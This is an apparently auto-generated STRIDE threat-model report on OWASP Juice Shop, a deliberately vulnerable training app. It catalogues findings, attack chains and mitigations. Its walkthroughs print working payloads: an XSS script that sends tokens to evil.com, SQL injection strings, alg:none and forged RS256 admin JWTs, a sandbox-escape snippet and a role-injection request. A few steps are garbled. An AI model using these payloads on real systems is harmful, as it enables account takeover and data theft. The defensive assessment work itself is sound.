Management Summary

Verdict

рџ”ґ OWASP Juice Shop carries a cluster of Critical vulnerabilities that combine into confirmed end-to-end attack chains: a hardcoded RSA private key at lib/insecurity.ts:23 lets any attacker mint admin-role JWTs the server accepts without question; raw SQL string interpolation at routes/login.ts:34 and routes/search.ts:23 allows authentication bypass and data exfiltration without credentials; and eval() at routes/b2bOrder.ts:23 exposes server-side code execution through the order endpoint. Six abuse chains were verified against the codebase - all confirmed exploitable.

Risk distribution: рџ”ґ Critical: 12 В· рџџ  High: 29 В· рџџЎ Medium: 8 В· рџџў Low: 2 В· Total: 51

Scope: 6 of 7 components received full STRIDE analysis - the externally-reachable, authentication-bearing, and business-critical surface. The other 1 (lower-priority / internal) were not individually assessed at this depth (see В§1 Scope).


Worst-case scenarios behind this verdict - what an attacker could do today:

  • Full admin takeover without credentials вЂ” The RSA private key is committed in plaintext at lib/insecurity.ts:23. An attacker clones the repo and calls jwt.sign({role:'admin'}, privateKey, {algorithm:'RS256'}) to forge a token the middleware at lib/insecurity.ts:54 accepts as authoritative вЂ” no password required. (рџ”ґ F-010 вЂ” Hardcoded Cryptographic Key вЂ” lib/insecurity.ts:23, рџ”ґ F-004 вЂ” Insecure JWT Verification вЂ” lib/insecurity.ts:54, рџ”ґ F-006 вЂ” JWT Algorithm Confusion вЂ” lib/insecurity.ts:54)
  • Customer data exfiltration via SQL injection вЂ” req.query.q flows unescaped into a raw models.sequelize.query() call at routes/search.ts:23. UNION-based payloads dump the full Users table, including hashed passwords and order histories, to any anonymous internet user. (рџ”ґ F-009 вЂ” SQL Injection вЂ” routes/search.ts:23, рџ”ґ F-007 вЂ” SQL Injection вЂ” routes/login.ts:34)
  • Server-side code execution through order processing вЂ” The B2B order endpoint at routes/b2bOrder.ts:23 passes attacker-supplied input to eval(). An authenticated user can execute arbitrary Node.js code on the server, reaching the host filesystem and internal network. (рџ”ґ F-012 вЂ” Remote Code Execution вЂ” routes/b2bOrder.ts:23)
  • Mass account compromise via stored XSS and token theft вЂ” Admin feedback review at administration.component.ts:78 calls bypassSecurityTrustHtml() and renders unsanitized HTML. An attacker injects a script that exfiltrates the JWT from localStorage for every administrator who views the page, as the token is stored in browser-readable storage. (рџ”ґ F-001 вЂ” Systemic XSS вЂ” administration.component.ts:78, рџџ  F-023 вЂ” JWT Bearer Token in localStorage вЂ” login.component.ts:101)
  • Horizontal privilege escalation across all customer accounts вЂ” Authorization checks on address, basket, and order routes rely on the request parameter rather than the authenticated session. Any logged-in user can substitute another user's ID to read or modify their orders and delivery addresses. (рџ”ґ F-008 вЂ” Insecure Direct Object Reference вЂ” routes/address.ts:11, рџ”ґ F-011 вЂ” Role Escalation вЂ” lib/insecurity.ts:54, рџ”ґ F-013 вЂ” Mass Assignment Role Injection вЂ” server.ts:419)

Remediation must start with the three controls that collapse multiple attack chains simultaneously: replacing the hardcoded signing key, parameterizing the raw SQL queries, and removing the server-side eval() call.

Attack-chain analysis. 4 findings anchor 5 code-verified attack chains (see В§9 Abuse Cases): рџ”ґ F-002 вЂ” Systemic Unverified Remote Code Execution in CI Pipeline (ci.yml:161), рџ”ґ F-003 вЂ” OAuth Implicit Flow with Derived Password (oauth.component.ts:30), рџ”ґ F-004 вЂ” Insecure JWT Verification (lib/insecurity.ts:54), рџ”ґ F-008 вЂ” Insecure Direct Object Reference (routes/address.ts:11). 1 of these is rated above its individual baseline as a direct result of the verified chain.

Architectural Anti-Patterns

The defects below are structural - each spans multiple findings and requires a design change, not a point fix. See В§7 Security Architecture for the per-control detail.

  • SPA without BFF вЂ” The Angular frontend stores the session JWT in localStorage, reachable by any script running in the page origin. Without a Backend-for-Frontend holding the token server-side in an HttpOnly cookie, stored XSS at any injection point in the SPA converts to a full session takeover вЂ” the XSS-then-localStorage chain is a confirmed abuse path in this assessment.

    • Affected components: C-01
    • Findings: рџџ  F-023 вЂ” JWT stored in browser localStorage, рџ”ґ F-001 вЂ” Systemic XSS in admin panel enables token theft

  • Secrets hardcoded in source вЂ” The RSA private key and JWT secret are committed in lib/insecurity.ts. Any actor with read access to the repository вЂ” including public forks вЂ” can forge arbitrarily-privileged session tokens without exploiting any other vulnerability.

    • Findings: рџ”ґ F-010 вЂ” Hardcoded RSA private key used for JWT signing, рџ”ґ F-029 вЂ” Cryptographic keys served unauthenticated via public route

  • Raw SQL string interpolation вЂ” Login and product search bypass the Sequelize ORM and concatenate req.body / req.query directly into SQL strings. The pattern recurs across multiple routes, making parameterization a codebase-wide fix rather than a single-site patch.

    • Findings: рџ”ґ F-007 вЂ” SQL injection in login route, рџ”ґ F-009 вЂ” SQL injection in product search route

  • Missing server-side authorization layer вЂ” Address, basket, and order routes resolve resource ownership from the URL parameter rather than from the authenticated session claim, with no centralized authorization middleware enforcing object-level ownership. This structural gap produces a systemic IDOR class across the data layer.

    • Findings: рџ”ґ F-008 вЂ” Insecure direct object reference across resource routes, рџ”ґ F-011 вЂ” Role escalation via unguarded JWT claim, рџ”ґ F-013 вЂ” Mass assignment role injection at registration

Security Posture & Top Threats

Figure 1 - Architecture & Top Threats

Architecture tiers top-to-bottom (External Actors в†’ Client в†’ Application в†’ Data) with the top threats per component. The in-figure legend on the right explains the attack scenarios, severity dots and symbols.

Figure 2 - Risk Flow: Actor в†’ Tier в†’ Impact

Heatmap: actors (left) в†’ architecture tiers (middle, Client в†’ Application в†’ Data) в†’ impact (right). Numbered red arrows в‘ вЂ“в‘Ґ are the threats enumerated in the Top Threats table below. Self-registration is open, so the Authenticated Internet Attacker tier is one POST away from anonymous - it is shown distinctly because a post-login endpoint is still a different attack surface.

Threat actors. The actors below drive the numbered attack paths in the figures above. The Shop User is the victim of client-side attacks (XSS / CSRF), not an attacker - in Figure 2 the compromise surfaces as the resulting business-impact node rather than as a separate actor box.

  • Shop User вЂ” legitimate customer; target of client-side attacks; target of в‘Ґ Output Encoding / Cross-Site Scripting.
  • Anonymous Internet Attacker вЂ” no account; registers in seconds when needed; drives в‘  Insecure Query Construction & Data Access, в‘Ў Hardcoded Secrets & Weak Cryptography, в‘Ј Sensitive File & Secret Exposure.
  • Authenticated Internet Attacker вЂ” owns a regular account; logged in; drives в‘ў Broken Authorization & Access Control, в‘¤ Remote Code Execution (unsafe eval).

6 structural threats, grouped by weakness class - each row is one threat, not one finding. Threat Description states the general architectural weakness (STRIDE in brackets); Findings lists the concrete instances, each linked to В§8 Findings Register with its component; Risk & Impact combines severity with business consequence.

# Threat Description Findings (в†’ Component) Risk & Impact Fix
в‘  Insecure Query Construction & Data Access (TВ·I)
User-controlled strings flow into raw models.sequelize.query() calls and XML parser options without parameterization, allowing SQL UNION dumps and XXE file reads from unauthenticated requests.		 рџ”ґВ F-007 - SQL Injection (routes/login.ts:34) в†’В C-06
рџ”ґВ F-009 - SQL Injection (routes/search.ts:23) в†’В C-02
рџџ В F-019 - NoSQL Injection (routes/showProductReviews.ts:36) в†’В C-02
рџџ В F-020 - XML External Entity Injection (routes/fileUpload.ts:83) в†’В C-02		 рџ”ґ Critical
Customer Data Exfiltration		 вќ¶ M-020 вЂ” Use parameterized database queries
вќ¶ M-022 вЂ” Use parameterized database queries
в‘Ў Hardcoded Secrets & Weak Cryptography (SВ·E)
The JWT signing key is committed in source, the verification middleware accepts the alg:none variant, and OAuth login derives a deterministic local password from the Google email - any of these three paths yields a valid admin session without knowledge of credentials.		 рџ”ґВ F-003 - OAuth Implicit Flow with Derived Password (oauth.component.ts:30) в†’В C-01
рџ”ґВ F-004 - Insecure JWT Verification (lib/insecurity.ts:54) в†’В C-06
рџ”ґВ F-005 - Weak Password Hashing MD5 Without Salt (lib/insecurity.ts:43) в†’В C-03
рџ”ґВ F-006 - JWT Algorithm Confusion (lib/insecurity.ts:54) в†’В C-02
рџ”ґВ F-010 - Hardcoded Cryptographic Key (lib/insecurity.ts:23) в†’В C-06
рџџ В F-029 - Cryptographic Keys Served Unauthenticated (server.ts:278) в†’В C-02
рџџЎВ F-043 - No container image signing in CI - :1 в†’В C-05		 рџ”ґ Critical
Full Admin Takeover В· Customer Data Exfiltration		 вќ¶ M-017 вЂ” Harden the authentication flow
вќ¶ M-018 вЂ” Hash passwords with a strong, salted algorithm
в‘ў Broken Authorization & Access Control (EВ·I)
Route authorization relies on request parameters rather than the authenticated session identity, and the registration endpoint allows role injection via mass assignment, letting any authenticated user elevate to admin or access other customers' resources.		 рџ”ґВ F-008 - Insecure Direct Object Reference (routes/address.ts:11) в†’В C-02
рџ”ґВ F-011 - Role Escalation (lib/insecurity.ts:54) в†’В C-06
рџ”ґВ F-013 - Mass Assignment Role Injection (server.ts:419) в†’В C-02
рџџ В F-025 - GitHub Actions workflow missing top-level permissions (update-news-www.yml:1) в†’В C-05
рџџ В F-035 - Sensitive Routes Registered Without Authentication Middleware (server.ts:310) в†’В C-02
рџџ В F-039 - NoSQL Mass-Update (routes/updateProductReviews.ts:17) в†’В C-02
рџџ В F-040 - Product Modification Without Auth Guard (server.ts:369) в†’В C-02
рџџЎВ F-044 - GitHub Actions GITHUB_TOKEN not minimized to contents:read (lock.yml:1) в†’В C-05		 рџ”ґ Critical
Full Admin Takeover В· Customer Data Exfiltration		 вќ¶ M-021 вЂ” Enforce object-level (ownership) authorization
вќ¶ M-024 вЂ” Enforce correct server-side authorization
в‘Ј Sensitive File & Secret Exposure (I)
confidential files, credentials, and management-plane endpoints are reachable on unauthenticated routes; SSRF lets the server fetch internal resources on the attacker's behalf; unsafe path-handling primitives leak server content.		 рџџ В F-030 - Access Log Exposure (server.ts:281) в†’В C-02
рџџ В F-031 - Unauthenticated Encryption Key File Exposure (server.ts:277) в†’В C-02
рџџ В F-032 - CTF Flag Broadcast to Unauthenticated WebSocket (lib/challengeUtils.ts:70) в†’В C-07
рџџ В F-051 - Data disclosure (challenges.yml:1381) в†’В C-03		 рџџ  High
Customer Data Exfiltration		 вќ· M-037 вЂ” Restrict /support/logs to authenticated admin users and scrub sensitive query parameters from log lines
вќ· M-038 вЂ” Add security.isAuthorized middleware before /encryptionkeys routes
в‘¤ Remote Code Execution (unsafe eval) (E)
The B2B order parsing endpoint passes attacker-supplied input to eval(), enabling authenticated users to execute arbitrary Node.js code on the server host.		 рџ”ґВ F-012 - Remote Code Execution (routes/b2bOrder.ts:23) в†’В C-02 рџ”ґ Critical
Full Server Compromise		 вќ¶ M-025 вЂ” Remove server-side evaluation of untrusted input
в‘Ґ Output Encoding / Cross-Site Scripting (TВ·I)
The admin feedback panel bypasses Angular's default sanitization via bypassSecurityTrustHtml(), and the saved login IP route persists unescaped input - both paths allow script injection that reads JWTs from localStorage in the victim's browser session.		 рџ”ґВ F-001 - Systemic XSS (administration.component.ts:78) в†’В C-01
рџџ В F-017 - Stored XSS (routes/saveLoginIp.ts:18) в†’В C-06
рџџ В F-023 - JWT Bearer Token in localStorage (login.component.ts:101) в†’В C-01		 рџ”ґ Critical
Customer Session Hijack		 вќ¶ M-014 вЂ” Encode output instead of bypassing the framework sanitizer
вќ· M-029 вЂ” Encode output instead of bypassing the framework sanitizer

STRIDE: S spoofing В· T tampering В· R repudiation В· I information disclosure В· D denial of service В· E elevation of privilege. Risk, findings, components, impact and Fix are derived deterministically; only the one-line weakness description is authored.

Verified attack chains. 5 fully viable (AC-T-002, AC-T-003, AC-T-004, AC-T-005, AC-T-006). These chains combine individual findings into end-to-end exploitation paths verified step-by-step against the code - see В§9 Abuse Cases for the per-step breakdown and blocking mitigations.

Top Mitigations

Highest-impact P1/P2 mitigations - 11 of 38 qualifying (51 total). Full detail in В§10 Mitigation Register. All 11 mitigation(s) that fix a Critical finding are always listed here.

# Component Mitigation Addresses Effort

6 C-03 вЂ” Data Layer (SQLite + File Store) вќ¶ M-018 вЂ” Hash passwords with a strong, salted algorithm рџ”ґ F-005 вЂ” Weak Password Hashing MD5 Without Salt (lib/insecurity.ts) Medium
7 C-06 вЂ” Authentication & Session Surface вќ¶ M-017 вЂ” Harden the authentication flow рџ”ґ F-004 вЂ” Insecure JWT Verification (lib/insecurity.ts) Low
8 C-06 вЂ” Authentication & Session Surface вќ¶ M-020 вЂ” Use parameterized database queries рџ”ґ F-007 вЂ” SQL Injection (routes/login.ts) Low
9 C-06 вЂ” Authentication & Session Surface вќ¶ M-023 вЂ” Move cryptographic keys to a managed secret store рџ”ґ F-010 вЂ” Hardcoded Cryptographic Key (lib/insecurity.ts) Medium
10 C-06 вЂ” Authentication & Session Surface вќ¶ M-024 вЂ” Enforce correct server-side authorization рџ”ґ F-011 вЂ” Role Escalation (lib/insecurity.ts) Medium

Operational Strengths

Operational controls rated Adequate or Partial - grouped into broad clusters (full per-control breakdown in В§7). Clusters demoted to Weak by open Critical/High findings appear in В§7 instead, not here.

StrengthWhat's in PlaceEffectivenessGapMitigates
Hardened HTTP StackBrowser-facing HTTP hardening - security headers, cookie flags, cross-origin policy, and abuse-protection limits.
Anti-Clickjacking (X-Frame-Options)		вљ пёЏ PartialCoverage incomplete - see В§7 control assessment.-
Observability & AuditRuntime visibility - access logging, audit trails, and operational telemetry for post-incident review.
Logging and Audit Trail		вљ пёЏ PartialCoverage incomplete - see В§7 control assessment.-

Bottom line: These controls narrow specific attack surfaces but none eliminates a Critical finding on its own.

Critical Attack Tree

The root is the worst-case attacker goal; below it, each capability branch groups the Critical findings that achieve it. Branches feed the goal by OR - any single path suffices.

Findings (full detail in В§8 Findings Register): рџ”ґ F-010 вЂ” Hardcoded Cryptographic Key вЂ” lib/insecurity.ts:23 Hardcoded RSA private key В· рџ”ґ F-006 вЂ” JWT Algorithm Confusion вЂ” lib/insecurity.ts:54 JWT algorithm confusion В· рџ”ґ F-004 вЂ” Insecure JWT Verification вЂ” lib/insecurity.ts:54 Insecure JWT verification В· рџ”ґ F-012 вЂ” Remote Code Execution вЂ” routes/b2bOrder.ts:23 eval() in order endpoint В· рџ”ґ F-007 вЂ” SQL Injection вЂ” routes/login.ts:34 SQL injection in login В· рџ”ґ F-009 вЂ” SQL Injection вЂ” routes/search.ts:23 SQL injection in search В· рџ”ґ F-011 вЂ” Role Escalation вЂ” lib/insecurity.ts:54 Role escalation via JWT В· рџ”ґ F-013 вЂ” Mass Assignment Role Injection вЂ” server.ts:419 Mass assignment role inject В· рџ”ґ F-001 вЂ” Systemic XSS вЂ” administration.component.ts:78 Systemic XSS admin panel В· рџ”ґ F-008 вЂ” Insecure Direct Object Reference вЂ” routes/address.ts:11 IDOR object reference В· рџ”ґ F-003 вЂ” OAuth Implicit Flow with Derived Password вЂ” oauth.component.ts:30 OAuth derived password flaw В· рџ”ґ F-005 вЂ” Weak Password Hashing MD5 Without Salt вЂ” lib/insecurity.ts:43 Weak MD5 password hashing

1. System Overview

Probably the most modern and sophisticated insecure web application

Repository: https://github.com/juice-shop/juice-shop Runtime: Node.js 20 - 24

Scope

juice-shop comprises 7 modeled components. This threat model applied full STRIDE threat analysis to 6 of 7 - the components on the externally-reachable, authentication-bearing, and business-critical surface: Angular SPA Frontend, Express Backend API, Data Layer (SQLite + File Store), CI/CD Pipeline (GitHub Actions), Authentication & Session Surface, Real-time WebSocket Channel. Selection criteria: frontend attack surface; crown-jewel; ci-cd / deployment; auth; internet-exposed.

The remaining 1 component(s) were not individually analyzed at this assessment depth (lower-priority / internal surface): B2B Order API (RCE endpoint). Re-run at a higher --assessment-depth to extend STRIDE coverage to them.

Out of scope: third-party hosted dependencies, browser runtime, operating-system kernel, and the underlying network infrastructure.

2. Architecture Diagrams

2.1 System Context

Who interacts with juice-shop from the outside, and through which channels. Solid arrows show normal usage; dashed red arrows mark unauthenticated probing or exploit paths (C4 Level 1).

Key takeaway: Every actor in the context interacts with juice-shop through its external interface, so authentication and input validation at that edge govern the entire attack surface.

2.2 Container Architecture

How the system decomposes into deployable units. Each box is a separate runtime process or service container; arrows show synchronous request paths between them. Components with в‰Ґ3 Critical findings carry a red border, в‰Ґ2 High amber (C4 Level 2).

Key takeaway: The system decomposes into 1 client, 5 application and 1 data unit(s); Express Backend API carries the most Critical findings (5) and bounds the worst-case blast radius.

2.3 Components

Who reaches each component, and through which trust zone. Four columns map external actors to the internal tiers (Client / Application / Data); solid green arrows show legitimate data flow, dashed red arrows mark intrusion vectors. The component table directly below holds source paths and linked threats per C-NN; per-finding evidence is in В§8 Findings Register.

Key takeaway: Express Backend API concentrates the most findings (17 of 51 across all components); the table below maps each component to its source paths and linked threats.

рџџЎ F-043 вЂ” No container image signing in CI вЂ” :1

рџџў F-050 вЂ” Renovate config not found at repo root (renovate.json:1)		 Analyzed

2.4 Technology Architecture

The technology stack the system is built on. Each box names the framework or runtime that fills that role; per-component findings live in the В§2.3 component table above, and the full per-finding catalogue is in В§8 Findings Register.

Key takeaway: The stack spans 1 data-tier store(s) behind the application tier; injection and data-at-rest exposure track the data tier, detailed per finding in В§8 Findings Register.

Legend: red border в‰Ґ 3 Critical threats on the component В· amber border в‰Ґ 2 High threats

3. Attack Walkthroughs

This section walks through how the highest-risk findings are exploited - one short walkthrough per Critical, each with attack steps, a focused sequence diagram, and the primary mitigation. The cross-finding view (which weaknesses combine toward the worst-case goal, and where one fix severs several paths) is in the Critical Attack Tree. Full per-finding context - severity rationale, assets, detection signals - is in the В§8 Findings Register row for each finding.

3.1 Systemic XSS

Source: рџ”ґ F-001 вЂ” frontend/src/app/administration/administration.component.ts:78

Severity Critical (CWE-79). STRIDE: Tampering. See В§8 F-001 for the full register row.

Attack Steps

  1. administration.component.ts:78 calls this.sanitizer.bypassSecurityTrustHtml(feedback.comment) on every feedback record fetched from /api/Feedbacks, and line 60 wraps user.email in a <span> interpolated via the same bypass.
  2. Both are bound to [innerHTML] in administration.component.html (lines 26 and 60 of the template).
  3. An unauthenticated attacker submits a POST to /api/Feedbacks with comment: '<script>fetch("https://evil.com/?"+localStorage.getItem("token"))</script>'.

Sequence Diagram

Key takeaway: Until вќ¶ M-014 (Encode output instead of bypassing the framework sanitizer) lands, рџ”ґ F-001 вЂ” Systemic XSS вЂ” administration.component.ts:78 is exploitable at frontend/src/app/administration/administration.component.ts:78 (Critical-severity, CWE-79).

Defense in Depth

  • Primary mitigation: вќ¶ M-014 (Encode output instead of bypassing the framework sanitizer)

3.2 OAuth Implicit Flow with Derived Password

Source: рџ”ґ F-003 вЂ” frontend/src/app/oauth/oauth.component.ts:30

Severity Critical (CWE-287). STRIDE: Spoofing. See В§8 F-003 for the full register row.

Attack Steps

  1. The Google OAuth integration at login.component.ts:134 uses response_type=token, initiating the implicit flow.
  2. The access_token arrives in the URL fragment (#access_token=вЂ¦) where it is visible to any JavaScript executing on the page, stored in browser history, and potentially leaked via the Referer header.
  3. At oauth.component.ts:30, the component derives the user's Juice Shop password as btoa(profile.email.split('').reverse().join('')) - a deterministic, reversible transformation of the email claim.

Sequence Diagram

Key takeaway: Until вќ· M-016 (Harden the authentication flow) lands, рџ”ґ F-003 вЂ” OAuth Implicit Flow with Derived Password вЂ” oauth.component.ts:30 is exploitable at frontend/src/app/oauth/oauth.component.ts:30 (Critical-severity, CWE-287).

Defense in Depth

  • Primary mitigation: вќ· M-016 (Harden the authentication flow)

3.3 Insecure JWT Verification

Source: рџ”ґ F-004 вЂ” lib/insecurity.ts:54

Severity Critical (CWE-287). STRIDE: Spoofing. See В§8 F-004 for the full register row.

Attack Steps

  1. security.isAuthorized() at lib/insecurity.ts:54 calls expressJwt({ secret: publicKey }) without specifying an algorithms array.
  2. Versions of express-jwt prior to the fix for CVE-2020-15084 accept alg:none tokens when no algorithm constraint is applied - an attacker crafts a JWT with header {"alg":"none"} and an arbitrary payload such as {"data":{"role":"admin","email":"attacker@x.com"}}, omits the signature, and the middleware accepts it.
  3. Separately, the RSA private key is hardcoded at lib/insecurity.ts:23 (see auth-003), so an attacker can also forge fully signed RS256 tokens offline.

Sequence Diagram

Key takeaway: Until вќ¶ M-017 (Harden the authentication flow) lands, рџ”ґ F-004 вЂ” Insecure JWT Verification вЂ” lib/insecurity.ts:54 is exploitable at lib/insecurity.ts:54 (Critical-severity, CWE-287).

Defense in Depth

  • Primary mitigation: вќ¶ M-017 (Harden the authentication flow)

3.4 Weak Password Hashing MD5 Without Salt

Source: рџ”ґ F-005 вЂ” lib/insecurity.ts:43

Severity Critical (CWE-916). STRIDE: Spoofing. See В§8 F-005 for the full register row.

Attack Steps

  1. The hash() function at lib/insecurity.ts:43 computes crypto.createHash('md5').update(data).digest('hex') with no salt.
  2. All user passwords stored in data/juiceshop.sqlite (Users table, password column) are unsalted MD5 digests.
  3. An attacker who obtains the SQLite file - via SQL injection union-select (see data-layer-002), path traversal, or server compromise - can recover all plaintext passwords from public rainbow tables in seconds.

Sequence Diagram

Key takeaway: Until вќ¶ M-018 (Hash passwords with a strong, salted algorithm) lands, рџ”ґ F-005 вЂ” Weak Password Hashing MD5 Without Salt вЂ” lib/insecurity.ts:43 is exploitable at lib/insecurity.ts:43 (Critical-severity, CWE-916).

Defense in Depth

  • Primary mitigation: вќ¶ M-018 (Hash passwords with a strong, salted algorithm)

3.5 JWT Algorithm Confusion

Source: рџ”ґ F-006 вЂ” lib/insecurity.ts:54

Severity Critical (CWE-327). STRIDE: Spoofing. See В§8 F-006 for the full register row.

Attack Steps

  1. express-jwt@0.1.3 is configured at lib/insecurity.ts:54 as expressJwt({ secret: publicKey }) with no algorithms: allowlist.
  2. This version of express-jwt predates the algorithms parameter and accepts any algorithm the token header declares.
  3. An attacker crafts a token with alg: none (unsigned) or switches the algorithm to HS256 and signs with the RSA public key (which is served unauthenticated at /encryptionkeys/jwt.pub).

Sequence Diagram

Key takeaway: Until вќ¶ M-019 (Replace the weak cryptographic algorithm) lands, рџ”ґ F-006 вЂ” JWT Algorithm Confusion вЂ” lib/insecurity.ts:54 is exploitable at lib/insecurity.ts:54 (Critical-severity, CWE-327).

Defense in Depth

  • Primary mitigation: вќ¶ M-019 (Replace the weak cryptographic algorithm)

3.6 SQL Injection

Source: рџ”ґ F-007 вЂ” routes/login.ts:34

Severity Critical (CWE-89). STRIDE: Tampering. See В§8 F-007 for the full register row.

Attack Steps

  1. req.body.email and req.body.password are interpolated directly into a raw SQL string at routes/login.ts:34 via models.sequelize.query(\``SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}'вЂ¦`)`.
  2. No parameterization or prepared statements are used.
  3. An attacker submits ' OR '1'='1 as the email value, which short-circuits the WHERE clause and returns the first Users row - the seeded admin account.

Sequence Diagram

Key takeaway: Until вќ¶ M-020 (Use parameterized database queries) lands, рџ”ґ F-007 вЂ” SQL Injection вЂ” routes/login.ts:34 is exploitable at routes/login.ts:34 (Critical-severity, CWE-89).

Defense in Depth

  • Primary mitigation: вќ¶ M-020 (Use parameterized database queries)

3.7 Insecure Direct Object Reference

Source: рџ”ґ F-008 вЂ” routes/address.ts:11

Severity Critical (CWE-639). STRIDE: Tampering. See В§8 F-008 for the full register row.

Attack Steps

  1. Server-side authorization MUST derive the resource owner from the authenticated session (req.user / req.session / req.auth), never from attacker-controlled request data.
  2. Trusting req.body.UserId etc. enables horizontal privilege escalation across all authenticated tenants.
  3. Send the crafted payload to the endpoint backed by routes/address.ts:11.

Sequence Diagram

Key takeaway: Until вќ¶ M-021 (Enforce object-level (ownership) authorization) lands, рџ”ґ F-008 вЂ” Insecure Direct Object Reference вЂ” routes/address.ts:11 is exploitable at routes/address.ts:11 (Critical-severity, CWE-639).

Defense in Depth

  • Primary mitigation: вќ¶ M-021 (Enforce object-level (ownership) authorization)

3.8 SQL Injection

Source: рџ”ґ F-009 вЂ” routes/search.ts:23

Severity Critical (CWE-89). STRIDE: Tampering. See В§8 F-009 for the full register row.

Attack Steps

  1. The product search handler at routes/search.ts:23 builds a raw SQL query by interpolating req.query.q directly into the SELECT string: SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name.
  2. No parameterization or prepared statement is used.
  3. An unauthenticated attacker submits a UNION-based payload (e.g., q=')) UNION SELECT * FROM Users--) to read all rows from the Users table, recovering email addresses and MD5 password hashes.

Sequence Diagram

Key takeaway: Until вќ¶ M-022 (Use parameterized database queries) lands, рџ”ґ F-009 вЂ” SQL Injection вЂ” routes/search.ts:23 is exploitable at routes/search.ts:23 (Critical-severity, CWE-89).

Defense in Depth

  • Primary mitigation: вќ¶ M-022 (Use parameterized database queries)

3.9 Hardcoded Cryptographic Key

Source: рџ”ґ F-010 вЂ” lib/insecurity.ts:23

Severity Critical (CWE-321). STRIDE: Information Disclosure. See В§8 F-010 for the full register row.

Attack Steps

  1. The RSA private key used to sign all JWTs is embedded as a string literal at lib/insecurity.ts:23.
  2. The Juice Shop repository is public on GitHub; anyone who clones it has the full private key.
  3. With it, they call jwt.sign({ data: { id: 1, role: 'admin', email: 'admin@juice-sh.op' } }, privateKey, { algorithm: 'RS256', expiresIn: '6h' }) and produce a token the server's isAuthorized() middleware accepts without question.

Sequence Diagram

Key takeaway: Until вќ¶ M-023 (Move cryptographic keys to a managed secret store) lands, рџ”ґ F-010 вЂ” Hardcoded Cryptographic Key вЂ” lib/insecurity.ts:23 is exploitable at lib/insecurity.ts:23 (Critical-severity, CWE-321).

Defense in Depth

  • Primary mitigation: вќ¶ M-023 (Move cryptographic keys to a managed secret store)

3.10 Role Escalation

Source: рџ”ґ F-011 вЂ” lib/insecurity.ts:54

Severity Critical (CWE-863). STRIDE: Elevation of Privilege. See В§8 F-011 for the full register row.

Attack Steps

  1. With the RSA private key available at lib/insecurity.ts:23, an attacker constructs a JWT payload { data: { id: <any>, role: 'admin', email: 'attacker@x.com' } } and signs it with jwt.sign(payload, privateKey, { algorithm: 'RS256' }).
  2. The isAuthorized() middleware at line 54 verifies the token against publicKey - which corresponds to the committed private key - and accepts it.
  3. The role claim is trusted without cross-checking against the database.

Sequence Diagram

Key takeaway: Until вќ¶ M-024 (Enforce correct server-side authorization) lands, рџ”ґ F-011 вЂ” Role Escalation вЂ” lib/insecurity.ts:54 is exploitable at lib/insecurity.ts:54 (Critical-severity, CWE-863).

Defense in Depth

  • Primary mitigation: вќ¶ M-024 (Enforce correct server-side authorization)

3.11 Remote Code Execution

Source: рџ”ґ F-012 вЂ” routes/b2bOrder.ts:23

Severity Critical (CWE-94). STRIDE: Elevation of Privilege. See В§8 F-012 for the full register row.

Attack Steps

  1. The B2B order endpoint at /b2b/v2/orders (routes/b2bOrder.ts:23) executes attacker-controlled body.orderLinesData inside vm.runInContext('safeEval(orderLinesData)', sandbox).
  2. The notevil@1.3.3 library is a known-incomplete sandbox that can be escaped via prototype manipulation (e.g.
  3. ({}).constructor.constructor('return process')().exit(1)).

Sequence Diagram

Key takeaway: Until вќ¶ M-025 (Remove server-side evaluation of untrusted input) lands, рџ”ґ F-012 вЂ” Remote Code Execution вЂ” routes/b2bOrder.ts:23 is exploitable at routes/b2bOrder.ts:23 (Critical-severity, CWE-94).

Defense in Depth

  • Primary mitigation: вќ¶ M-025 (Remove server-side evaluation of untrusted input)

3.12 Mass Assignment Role Injection

Source: рџ”ґ F-013 вЂ” server.ts:419

Severity Critical (CWE-915). STRIDE: Elevation of Privilege. See В§8 F-013 for the full register row.

Attack Steps

  1. The finale-rest auto-generated POST /api/Users endpoint persists all body fields to the UserModel without stripping privileged attributes.
  2. Sequelize's create() called by finale-rest accepts the role field from the request body.
  3. An attacker sends POST /api/Users with {"email":"attacker@evil.com","password":"pass","role":"admin"}.

Sequence Diagram

Key takeaway: Until вќё M-001 (Manual review: verify Mass Assignment Role Injection via Use) lands, рџ”ґ F-013 вЂ” Mass Assignment Role Injection вЂ” server.ts:419 is exploitable at server.ts:419 (Critical-severity, CWE-915).

Defense in Depth

  • Primary mitigation: вќё M-001 (Manual review: verify Mass Assignment Role Injection via User Registration)

5. Attack Surface

Network-reachable entry points classified by authentication requirement. Each row links to the threat(s) referenced in its Notes column. The Risk column reflects the highest-severity linked finding. Entry points with no linked finding are still listed when they sit on a sensitive surface (authentication, registration, management) or look like a missing-auth/authz suspect - marked вљ‘ Review in Notes.

вљ‘ Review: no auth guard detected
POST/вЂ‹rest/вЂ‹web3/вЂ‹walletExploitAddress-handler: server.ts:642
вљ‘ Review: no auth guard detected
POST/rest/web3/walletNFTVerify-handler: server.ts:641
вљ‘ Review: no auth guard detected
POST/snippets/fixes-handler: server.ts:670
вљ‘ Review: no auth guard detected
POST/snippets/verdict-handler: server.ts:668
вљ‘ Review: no auth guard detected

28 further entry point(s) in this category carry no linked finding and no elevated review signal, and are not listed individually (57 total). The complete route inventory is available in .route-inventory.json and, when exported, pentest-tasks.yaml.
